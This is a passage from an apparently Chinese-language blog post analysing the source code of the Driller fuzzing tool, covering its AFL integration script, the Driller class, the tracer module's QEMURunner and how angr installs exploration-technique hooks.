sys.exit(<span class="number">1</span>)</span><br><span class="line">	<span class="comment">#将第一个参数也就是binary文件路径赋值给binary变量</span></span><br><span class="line">    <span class="comment">#将第二个参数也就是AFL output的文件夹赋值给fuzzer_dir,用来保存driller生成的input</span></span><br><span class="line">    _, binary, fuzzer_dir = sys.argv</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Figure out directories and inputs</span></span><br><span class="line">    <span class="comment"># 获取AFL的bitmap值</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(fuzzer_dir, <span class="string">&#x27;fuzz_bitmap&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> bitmap_file:</span><br><span class="line">        fuzzer_bitmap = bitmap_file.read()</span><br><span class="line">    <span class="comment"># 获取AFL输入队列的目录</span></span><br><span class="line">    source_dir = os.path.join(fuzzer_dir, <span class="string">&#x27;queue&#x27;</span>)</span><br><span class="line">    <span class="comment"># driller输出目录</span></span><br><span class="line">    dest_dir = os.path.join(fuzzer_dir, <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;driller&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make sure destination exists</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(dest_dir)</span><br><span class="line">    <span class="keyword">except</span> os.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> e.errno != errno.EEXIST:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    seen = <span class="built_in">set</span>()  <span class="comment"># Keeps track of source files already drilled</span></span><br><span class="line">    <span class="comment"># driller/queue目录中的数量</span></span><br><span class="line">    count = <span class="built_in">len</span>(os.listdir(dest_dir))  <span class="comment"># Helps us name outputs correctly</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Repeat forever in case AFL finds something new</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># Go through all of the files AFL has generated, but only once each</span></span><br><span class="line">        <span class="keyword">for</span> source_name <span class="keyword">in</span> os.listdir(source_dir):</span><br><span class="line">            <span class="comment"># 如果 source_name 已经在 seen 中，表示已经处理过这个 input，直接跳过</span></span><br><span class="line">            <span class="keyword">if</span> source_name <span class="keyword">in</span> seen <span class="keyword">or</span> <span class="keyword">not</span> source_name.startswith(<span class="string">&#x27;id:&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 否则将其加入 seen 中，并将其作为 driller 的输入来做concolic execution</span></span><br><span class="line">            seen.add(source_name)</span><br><span class="line">            <span class="comment"># 获取该种子文件的内容</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(source_dir, source_name), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> seedfile:</span><br><span class="line">                seed = seedfile.read()</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Drilling input: %s&#x27;</span> % seed)</span><br><span class="line">            <span class="comment"># 传入当前种子，和AFL的bitmap信息，调用Driller开始获取符号执行的生成的输入，并将这些输入都保存到指定目录中</span></span><br><span class="line">            <span class="keyword">for</span> _, new_input <span class="keyword">in</span> Driller(binary, seed, fuzzer_bitmap).drill_generator():</span><br><span class="line">                save_input(new_input, dest_dir, count)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Try a larger input too because Driller won&#x27;t do it for you</span></span><br><span class="line">            seed = seed + <span class="string">b&#x27;0000&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Drilling input: %s&#x27;</span> % seed)</span><br><span class="line">            <span class="keyword">for</span> _, new_input <span class="keyword">in</span> Driller(binary, seed, fuzzer_bitmap).drill_generator():</span><br><span class="line">                save_input(new_input, dest_dir, count)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>先看下脚本的大致功能：首先设置好需要用到的AFL的 queue 以及 bitmap 文件路径，及存储 driller 生成数据的路径，遍历 queue 中AFL认为 interesting 的 seeds，将其作为 driller 的输入进行 concolic execution，然后保存 driller 生成的数据到指定目录供 AFL 使用。</p>
<p>在 main 函数中，最关键的部分就是 <code>Driller()</code> 类以及其成员方法 <code>drill_generator()</code>，所以我们暂时只看 Driller 中发挥关键作用的部分（即这个 <code>drill_generate()</code> ，其他的诸如 <code>shellphuzz</code>，<code>Fuzzer</code> 等，都是对已有工具的包装，是一个 wrapper ，留着以后再分析。</p>
<h2 id="0x02-driller-关键函数源码分析"><a href="#0x02-driller-关键函数源码分析" class="headerlink" title="0x02 driller 关键函数源码分析"></a>0x02 driller 关键函数源码分析</h2><p><strong>Driller</strong> 源码地址为：<a href="https://github.com/shellphish/driller">https://github.com/shellphish/driller</a></p>
<p><code>Driller</code> 类以及成员函数 <code>drill_generate()</code> 定义在 <code>driller_main.py</code> 文件中，类中主要函数如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Driller</span>(<span class="title class_ inherited__">object</span>)</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Driller object, symbolically follows an input looking for new state transitions.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, binary, input_str, fuzz_bitmap=<span class="literal">None</span>, tag=<span class="literal">None</span>, redis=<span class="literal">None</span>, hooks=<span class="literal">None</span>, argv=<span class="literal">None</span></span>)</span><br><span class="line">    <span class="comment"># DRILLING</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">drill_generator</span>(<span class="params">self</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_drill_input</span>(<span class="params">self</span>)</span><br><span class="line">    <span class="comment"># EXPLORE</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_symbolic_explorer_stub</span>(<span class="params">self, state</span>)</span><br><span class="line">    <span class="comment"># UTILS</span></span><br><span class="line"><span class="meta">    @static</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_set_concretizations</span>(<span class="params">state</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_writeout</span>(<span class="params">self, prev_addr, state</span>)</span><br></pre></td></tr></table></figure>

<p>我们先看类的构造函数 <code>__init__()</code> 进行的初始化操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, binary, input_str, fuzz_bitmap=<span class="literal">None</span>, tag=<span class="literal">None</span>, redis=<span class="literal">None</span>, hooks=<span class="literal">None</span>, argv=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param binary     : The binary to be traced.</span></span><br><span class="line"><span class="string">        :param input_str  : Input string to feed to the binary.</span></span><br><span class="line"><span class="string">        :param fuzz_bitmap: AFL&#x27;s bitmap of state transitions (defaults to empty).</span></span><br><span class="line"><span class="string">        :param redis      : redis.Redis instance for coordinating multiple Driller instances.</span></span><br><span class="line"><span class="string">        :param hooks      : Dictionary of addresses to simprocedures.</span></span><br><span class="line"><span class="string">        :param argv       : Optionally specify argv params (i,e,: [&#x27;./calc&#x27;, &#x27;parm1&#x27;]),</span></span><br><span class="line"><span class="string">                            defaults to binary name with no params.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        self.binary      = binary</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Redis channel identifier.</span></span><br><span class="line">        self.identifier  = os.path.basename(binary) <span class="comment">#self.identifier = self.binary_name</span></span><br><span class="line">        self.<span class="built_in">input</span>       = input_str</span><br><span class="line">        self.fuzz_bitmap = fuzz_bitmap</span><br><span class="line">        self.tag         = tag</span><br><span class="line">        self.redis       = redis</span><br><span class="line">        self.argv = argv <span class="keyword">or</span> [binary]</span><br><span class="line"></span><br><span class="line">        self.base = os.path.join(os.path.dirname(__file__), <span class="string">&quot;..&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># The simprocedures.要hook的函数</span></span><br><span class="line">        self._hooks = &#123;&#125; <span class="keyword">if</span> hooks <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> hooks</span><br><span class="line"></span><br><span class="line">        <span class="comment"># The driller core, which is now an exploration technique in angr.</span></span><br><span class="line">        <span class="comment"># angr中的探索技术</span></span><br><span class="line">        self._core = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Start time, set by drill method.开始时间</span></span><br><span class="line">        self.start_time = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set of all the generated inputs.生成的input的集合</span></span><br><span class="line">        self._generated = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set the memory limit specified in the config.</span></span><br><span class="line">        <span class="keyword">if</span> config.MEM_LIMIT <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            resource.setrlimit(resource.RLIMIT_AS, (config.MEM_LIMIT, config.MEM_LIMIT))</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        使用 resource.RLIMIT_AS 来查询或设置进程的地址空间大小限制（内存限制）</span></span><br><span class="line"><span class="string">        eg: # 设置内存限制（单位：字节）</span></span><br><span class="line"><span class="string">        resource.setrlimit(resource.RLIMIT_AS, (1024 * 1024 * 256, 1024 * 1024 * 512))  # 设置软限制为256MB，硬限制为512MB</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        l.debug(<span class="string">&quot;[%s] drilling started on %s.&quot;</span>, self.identifier, time.ctime(self.start_time))</span><br></pre></td></tr></table></figure>

<p>可以看到，前三个参数就是我们在 run_driller.py 脚本中传入的三个参数，分别是 bianry 文件的路径、binary 文件接受的输入（也就是 seeds）、AFL 的 bitmap 文件内容。后面参数的作用查看注释即可。在 <code>__init__()</code> 函数中，首先对类中的公有或私有(以_开头)属性进行赋值，并进行一些配置项的设置。</p>
<p>接下来，我们看脚本中调用的 <code>drill_generator()</code> 函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">drill_generator</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        A generator interface to the actual drilling.</span></span><br><span class="line"><span class="string">        真正drilling的生成器接口</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set up alarm for timeouts.</span></span><br><span class="line">        <span class="comment"># 设置超时警报</span></span><br><span class="line">        <span class="keyword">if</span> config.DRILL_TIMEOUT <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            signal.alarm(config.DRILL_TIMEOUT)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self._drill_input():</span><br><span class="line">            <span class="keyword">yield</span> i</span><br></pre></td></tr></table></figure>

<p>可以看到，run_driller.py 脚本中调用的函数是一个生成器函数，在内部不断调用类私有方法 <code>self._drill_input()</code> 来获取 driller 生成的输入，并不断通过 yield 语句输出。</p>
<p>所以真正发挥作用的是<a id="_drill_input"> <code>self._drill_input()</code> </a>函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_drill_input</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Symbolically step down a path with a tracer, trying to concretize inputs for unencountered</span></span><br><span class="line"><span class="string">        state transitions.</span></span><br><span class="line"><span class="string">        沿着tracer给出的path一步一步符号化，尝试将未遇到的状态转换的输入具体化，即求解出未遇到状态的输入</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># initialize the tracer</span></span><br><span class="line">        <span class="comment"># 实例化 QEMURunner 类对象</span></span><br><span class="line">        r = tracer.qemu_runner.QEMURunner(self.binary, self.<span class="built_in">input</span>, argv=self.argv)</span><br><span class="line">        <span class="comment"># 创建 angr project</span></span><br><span class="line">        p = angr.Project(self.binary)</span><br><span class="line">        <span class="comment"># 对传入的需要 hook 的函数做 hook 操作</span></span><br><span class="line">        <span class="keyword">for</span> addr, proc <span class="keyword">in</span> self._hooks.items():</span><br><span class="line">            p.hook(addr, proc)</span><br><span class="line">            l.debug(<span class="string">&quot;Hooking %#x -&gt; %s...&quot;</span>, addr, proc.display_name)</span><br><span class="line">        <span class="comment"># 判断待分析的binary的操作系统类型</span></span><br><span class="line">        <span class="keyword">if</span> p.loader.main_object.os == <span class="string">&#x27;cgc&#x27;</span>:</span><br><span class="line">            p.simos.syscall_library.update(angr.SIM_LIBRARIES[<span class="string">&#x27;cgcabi_tracer&#x27;</span>])</span><br><span class="line"></span><br><span class="line">            s = p.factory.entry_state(stdin=angr.SimFileStream, flag_page=r.magic, mode=<span class="string">&#x27;tracing&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 除了 cgc 之外的，全部使用full_init_state获取初始状态。</span></span><br><span class="line">            <span class="comment"># 将程序的标准输入流stdin符号化，设置mode为&#x27;tracing&#x27;</span></span><br><span class="line">            <span class="comment"># &#x27;tracing&#x27;：这是一种常见的模式，用于创建一个用于路径跟踪（path tracing）的符号状态。在这种模式下，符号状态会记录路径执行的信息，包括指令和内存访问。这对于分析程序的执行路径非常有用。</span></span><br><span class="line">            s = p.factory.full_init_state(stdin=angr.SimFileStream, mode=<span class="string">&#x27;tracing&#x27;</span>)</span><br><span class="line">        <span class="comment"># 预先给符号执行添加约束，preconstrainer添加的约束可以在后面删除</span></span><br><span class="line">        <span class="comment"># preconstrain_file方法用于为文件设置约束，将s.posix.stdin(符号执行的输入)设置为self.input(传递给Driller的testcase)</span></span><br><span class="line">        <span class="comment"># True表示将文件内容解析为具体的数据值。这里应该是就是实现angr concolic execution的方式</span></span><br><span class="line">        s.preconstrainer.preconstrain_file(self.<span class="built_in">input</span>, s.posix.stdin, <span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#save_unset 将不可满足的状态存入“unsat存储”，hierarchy表示一个StateHierarchy对象，来跟踪状态之间的关系。</span></span><br><span class="line">        simgr = p.factory.simulation_manager(s, save_unsat=<span class="literal">True</span>, hierarchy=<span class="literal">False</span>, save_unconstrained=r.crash_mode)</span><br><span class="line">        <span class="comment"># 实例化一个Tracer类对象</span></span><br><span class="line">        <span class="comment"># trace 参数指定了要跟踪的执行路径，探测器将按照提供的执行路径来执行程序</span></span><br><span class="line">        <span class="comment"># crash_addr 参数指定了程序崩溃的地址，如果程序在执行过程中崩溃，探测器将停止跟踪，并记录crash state到“crashed” stash中</span></span><br><span class="line">        <span class="comment"># copy_states=True：这个参数控制是否在跟踪过程中复制符号状态。如果设置为 True，则探测器会为每个跟踪步骤创建符号状态的副本，以防止状态共享和互相干扰。</span></span><br><span class="line">        <span class="comment"># follow_unsat 参数控制是否跟踪不可满足的路径。如果设置为 True，则探测器将继续跟踪路径，即使遇到不可满足的约束条件。</span></span><br><span class="line">        t = angr.exploration_techniques.Tracer(trace=r.trace, crash_addr=r.crash_addr, copy_states=<span class="literal">True</span>, follow_unsat=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        self._core = angr.exploration_techniques.DrillerCore(trace=r.trace, fuzz_bitmap=self.fuzz_bitmap)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        exploration_techniques:</span></span><br><span class="line"><span class="string">        Tracer():An exploration technique that follows an angr path with a concrete input.</span></span><br><span class="line"><span class="string">                 The tracing result is the state at the last address of the trace, which can be found in the &#x27;traced&#x27; stash.</span></span><br><span class="line"><span class="string">                 If the given concrete input makes the program crash, you should provide crash_addr, and the crashing state will be found in the &#x27;crashed&#x27; stash.</span></span><br><span class="line"><span class="string">        Oppologist():The Oppologist is an exploration technique that forces uncooperative code through qemu.</span></span><br><span class="line"><span class="string">        DrillerCore():An exploration technique that symbolically follows an input looking for new state transitions.</span></span><br><span class="line"><span class="string">                      It has to be used with Tracer exploration technique. Results are put in &#x27;diverted&#x27; stash.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        simgr.use_technique(t)</span><br><span class="line">        simgr.use_technique(angr.exploration_techniques.Oppologist())</span><br><span class="line">        simgr.use_technique(self._core)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置对内存、寄存器符号化操作的阈值</span></span><br><span class="line">        self._set_concretizations(simgr.one_active)</span><br><span class="line"></span><br><span class="line">        l.debug(<span class="string">&quot;Drilling into %r.&quot;</span>, self.<span class="built_in">input</span>)</span><br><span class="line">        l.debug(<span class="string">&quot;Input is %r.&quot;</span>, self.<span class="built_in">input</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> simgr.active <span class="keyword">and</span> simgr.one_active.<span class="built_in">globals</span>[<span class="string">&#x27;trace_idx&#x27;</span>] &lt; <span class="built_in">len</span>(r.trace) - <span class="number">1</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check here to see if a crash has been found.</span></span><br><span class="line">            <span class="keyword">if</span> self.redis <span class="keyword">and</span> self.redis.sismember(self.identifier + <span class="string">&#x27;-finished&#x27;</span>, <span class="literal">True</span>):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="comment"># diverted 应该是发生状态转移</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;diverted&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> simgr.stashes:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 当检测到状态转移时,弹出状态 这里的diverted 是在DillerCore探索策略中的step方法中添加的</span></span><br><span class="line">            <span class="keyword">while</span> simgr.diverted:</span><br><span class="line">                state = simgr.diverted.pop(<span class="number">0</span>)</span><br><span class="line">                l.debug(<span class="string">&quot;Found a diverted state, exploring to some extent.&quot;</span>)</span><br><span class="line">                <span class="comment"># 首先调用_writeout来求解</span></span><br><span class="line">                w = self._writeout(state.history.bbl_addrs[-<span class="number">1</span>], state)</span><br><span class="line">                <span class="keyword">if</span> w <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="keyword">yield</span> w</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> self._symbolic_explorer_stub(state):</span><br><span class="line">                    <span class="keyword">yield</span> i</span><br></pre></td></tr></table></figure>

<p>首先我们看到，该函数也是一个生成器函数，通过 yield 语句来返回生成的值，然后我们从头开始一点点分析该函数的功能。</p>
<p>函数首先实例化了一个 <code>QEMURunner</code> 类对象 <code>r</code>，该类定义在 angr 中的一个单独的模块 <code>Tracer</code> 中，该模块源码地址为：<a href="https://github.com/angr/tracer">https://github.com/angr/tracer</a></p>
<hr>
<h3 id="Tracer-模块"><a href="#Tracer-模块" class="headerlink" title="Tracer 模块"></a>Tracer 模块</h3><blockquote>
<p>This package is in a bit of a complicated transition phase - it originally housed the concolic tracing helpers for angr, but those pieces of code have since been merged into angr proper</p>
</blockquote>
<p>进入仓库，可以看到其 Readme 给的信息很少，我们主要看看 driller 使用了 tracer 模块中的哪些 function，在项目中 grep 下，发现只有 driller_main.py 文件中使用了 tracer ，也就是实例化一个 <code>QEMURunner</code> 类对象：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = tracer.qemu_runner.QEMURunner(self.binary, self.<span class="built_in">input</span>, argv=self.argv)</span><br></pre></td></tr></table></figure>

<p>接下来我们对对象 <code>r</code> 进行分析。在 driller_main.py 中，总共使用了 <code>r</code> 对象里的四个属性：<code>r.trace</code>、<code>r.magic</code>、<code>r.crash_mode</code>、<code>r.crash_addr</code>。</p>
<p>QEMURunner() 类的构造函数大致功能为，将传入的 self.input 作为 self.binary 的输入，使用Qemu模拟执行 self.input，self.argv 是其命令行参数。（具体可查看源码，对于分析 driller 只需要理解大致功能就够用了）</p>
<p><code>r.trace</code>：记录了对于此次输入 self.input 程序执行的基本块的序列（应该是Qemu记录到的，跟angr一样，对于call也会划分基本块）</p>
<p><code>r.crash_mode</code>：记录此次输入执行后是否发生了crash</p>
<p><code>r.carsh_addr</code>：记录此次输入执行后发生crash的 faulting 地址</p>
<p><code>r.magic</code>：源码注释中说，作用是来保持符号跟踪与其 dynamic counterpart 遵循相同的路径，这个暂时没太看懂。</p>
<p><code>r.trace</code>：以示例程序 buggy 来举例，编译时注意开下-no-pie</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; import tracer</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; r = tracer.qemu_runner.QEMURunner(<span class="string">&quot;./buggy&quot;</span>,b<span class="string">&quot;sth&quot;</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="keyword">for</span> addr <span class="keyword">in</span> r.trace:</span></span><br><span class="line">		if (addr&lt;0x4000000000): #这里说明一下,r.tarce记录程序内所有基本块的地址，但我们只关注text中的addr，做粗略过滤</span><br><span class="line">			print(hex(addr))</span><br><span class="line">···</span><br><span class="line">0x4005a7</span><br><span class="line">0x4004b0</span><br><span class="line">0x4005f0</span><br><span class="line">0x400629</span><br><span class="line">0x400490</span><br><span class="line">0x400635</span><br><span class="line">0x40064e</span><br><span class="line">0x400570</span><br><span class="line">0x400579</span><br><span class="line">0x400500</span><br><span class="line">0x400528</span><br><span class="line">0x400582</span><br><span class="line">0x4006c4</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt;</span>		</span><br></pre></td></tr></table></figure>

<p>Tracer 模块暂时介绍到这里就够分析 driller 用了。</p>
<hr>
<p>我们看完 Tracer 继续往下看：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = angr.Project(self.binary)</span><br><span class="line"><span class="keyword">for</span> addr, proc <span class="keyword">in</span> self._hooks.items():</span><br><span class="line">	p.hook(addr, proc)</span><br><span class="line">    l.debug(<span class="string">&quot;Hooking %#x -&gt; %s...&quot;</span>, addr, proc.display_name)</span><br><span class="line"><span class="keyword">if</span> p.loader.main_object.os == <span class="string">&#x27;cgc&#x27;</span>:</span><br><span class="line">    p.simos.syscall_library.update(angr.SIM_LIBRARIES[<span class="string">&#x27;cgcabi_tracer&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    s = p.factory.entry_state(stdin=angr.SimFileStream, flag_page=r.magic, mode=<span class="string">&#x27;tracing&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s = p.factory.full_init_state(stdin=angr.SimFileStream, mode=<span class="string">&#x27;tracing&#x27;</span>)</span><br><span class="line">s.preconstrainer.preconstrain_file(self.<span class="built_in">input</span>, s.posix.stdin, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这段代码也很好看，首先创建一个待符号执行的 binary 的 angr Project 为 <code>p</code> 。然后根据初始化Driller类成员时传入的 hooks（要 hook 的函数）在项目 <code>p</code> 中对其进行 hook 操作。接着，判断程序的目标操作系统，根据其是否为 cgc 类型来确定程序开始符号执行时的程序状态（状态预设），当 binary 为非 cgc 程序时，将调用 <code>full_inti_state</code> 状态构造函数。这里对是否是 cgc 程序的判断相当于是对 cgc 程序单独做了额外的优化。最后，调用 preconstrainer_file 方法对文件预先设置约束，将 <code>s.posix.stdin</code> ( concolic 执行的输入)设置为 <code>self.input</code> (传递给 Driller 的seed)，True 参数表示将文件内容解析为具体的数据值。</p>
<p>接下来，就是重要的地方了，<code>exploration_techniques</code> 和 <code>use_techniques</code> ，关于这两个的介绍，我在网上找了好久的博客都没有找到详细介绍的，而且我对 angr 是如何使用 <code>exploration_techniques</code> 尤其是多个并用非常疑惑和好奇，问了ChatGPT也看的比较懵，所以还是得自己一点一点啃源码理解。继续看 <code>self._dirll_input()</code> 代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simgr = p.factory.simulation_manager(s, save_unsat=<span class="literal">True</span>, hierarchy=<span class="literal">False</span>, save_unconstrained=r.crash_mode)</span><br><span class="line">t = angr.exploration_techniques.Tracer(trace=r.trace, crash_addr=r.crash_addr, copy_states=<span class="literal">True</span>, follow_unsat=<span class="literal">True</span>)</span><br><span class="line">self._core = angr.exploration_techniques.DrillerCore(trace=r.trace, fuzz_bitmap=self.fuzz_bitmap)</span><br><span class="line">simgr.use_technique(t)</span><br><span class="line">simgr.use_technique(angr.exploration_techniques.Oppologist())</span><br><span class="line">simgr.use_technique(self._core)</span><br></pre></td></tr></table></figure>

<p>这里我最好奇的点是，这些探索技术是如何运用到探索过程中的，如果之前看过 angr exploration_techniques 模块的源码，会发现，几乎每一个类中都有 <code>step()</code> 方法，只执行<code>simgr.step()</code> 的情况下，这些方法是如何跟 simulation_manage 类中的 <code>step()</code> 方法结合协作选择下一个状态呢？接下来，我们就来一点一点分析。</p>
<p>首先，我们通过 <code>simulation_manager()</code> 方法得到一个 SimulationManager 对象 simgr，用来管理我们后续符号执行得到的状态。</p>
<p>接下来，就是创建所需要的 exploration_techniques 对象，driller 一共创建了三个，分别为：</p>
<ul>
<li><p><code>Tracer()</code>：An exploration technique that follows an angr path with a concrete input. The tracing result is the state at the last address of the trace, which can be found in the ‘traced’ stash. If the given concrete input makes the program crash, you should provide crash_addr, and the crashing state will be found in the ‘crashed’ stash.</p>
</li>
<li><p><code>Oppologist()</code>：The Oppologist is an exploration technique that forces uncooperative code through qemu.</p>
</li>
<li><p><code>DrillerCore()</code>：An exploration technique that symbolically follows an input looking for new state transitions. It has to be used with Tracer exploration technique. Results are put in ‘diverted’ stash.</p>
</li>
</ul>
<p>接下来，simgr 分别调用 <code>use_technique()</code> 函数来应用创建的探索技术。<code>use_technique()</code> 函数源码在 simulation_manage.py 中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">use_technique</span>(<span class="params">self, tech</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Use an exploration technique with this SimulationManager.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Techniques can be found in :mod:`angr.exploration_techniques`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param tech:    An ExplorationTechnique object that contains code to modify</span></span><br><span class="line"><span class="string">                        this SimulationManager&#x27;s behavior.</span></span><br><span class="line"><span class="string">        :type tech:     ExplorationTechnique</span></span><br><span class="line"><span class="string">        :return:        The technique that was added, for convenience</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(tech, ExplorationTechnique):</span><br><span class="line">            <span class="keyword">raise</span> SimulationManagerError</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">XXX:</span> as promised</span></span><br><span class="line">        tech.project = self._project</span><br><span class="line">        tech.setup(self)</span><br><span class="line">        <span class="comment"># **tech._get_hooks() 理解：是一个参数解包操作，将tech._get_hooks()函数返回的字典作为关键字参数传递给HookSet.install_hooks()</span></span><br><span class="line">        <span class="comment"># _get_hooks()函数返回一个字典，其中包含了exploration_techniques类中定义的一组钩子函数。这些钩子函数是通过检查_hook_list列表中的每个元素，并调用_is_overriden方法来确定是否被子类重写而生成的。</span></span><br><span class="line">        <span class="comment"># 简单来说也就是返回应用的tech技术中，在_hook_list = (&quot;step&quot;, &quot;filter&quot;, &quot;selector&quot;, &quot;step_state&quot;, &quot;successors&quot;)列表里面的，重新实现的函数。</span></span><br><span class="line">        </span><br><span class="line">        HookSet.install_hooks(self, **tech._get_hooks())</span><br><span class="line">        self._techniques.append(tech)</span><br><span class="line">        <span class="keyword">return</span> tech</span><br></pre></td></tr></table></figure>

<p>可以看到，函数首先判断传入的参数 tech 是不是 ExplorationTechnique类型，然后调用该探索方法内置的 <code>setup()</code> 函数来做初始化（setup）操作。具体每一个探索技术的 setup() 函数的细节，这里先暂时跳过，等后边再开一节详细介绍。</p>
<p>然后调用 <code>HookSet</code> 类的静态方法 <code>install_hooks()</code> 函数来进行 hook ，这里就是 angr 如何利用多个探索技术的关键所在。我们首先解释下参数，然后再来看 HookSet 类及其静态方法的源码：</p>
<p>install_hooks 函数参数 <code>**tech._get_hooks()</code> 是一个参数解包操作，tech 是一个实例化的探索方法对象，<code>tech._get_hooks()</code> 函数是类的一个私有方法，定义在 angr exploration_techniques 目录下的 <code>__init__.py</code> 文件中，该文件定义了一个基类 <code>ExplorationTechnique</code> ，angr 自带的或自定义的探索方法均继承自这个类：</p>
